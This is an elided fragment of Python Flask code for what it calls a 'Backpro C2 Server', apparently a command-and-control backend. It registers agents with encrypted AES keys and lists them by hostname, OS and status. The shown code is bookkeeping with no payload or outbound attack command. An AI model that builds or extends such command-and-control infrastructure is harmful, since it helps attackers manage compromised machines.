...
def handshake():
    try:
        ...
        cursor.execute("""
            INSERT INTO agents (uuid, aes_key_encrypted, last_seen, status)
            VALUES (?, ?, ?, 'active')
        ...
        return jsonify({"message": "handshake failed"}), 500

@app.route('/')
def home():
    return "<h1>Backpro C2 Server is Running!</h1>"
...
def get_agents():
    try:
        ...
        query = """
            SELECT id, uuid, hostname, os_arch, version, status, connected, last_seen 
            FROM agents WHERE 1=1
        """
        params = []

        if search:
            query += " AND (hostname LIKE ? OR uuid LIKE ?)"
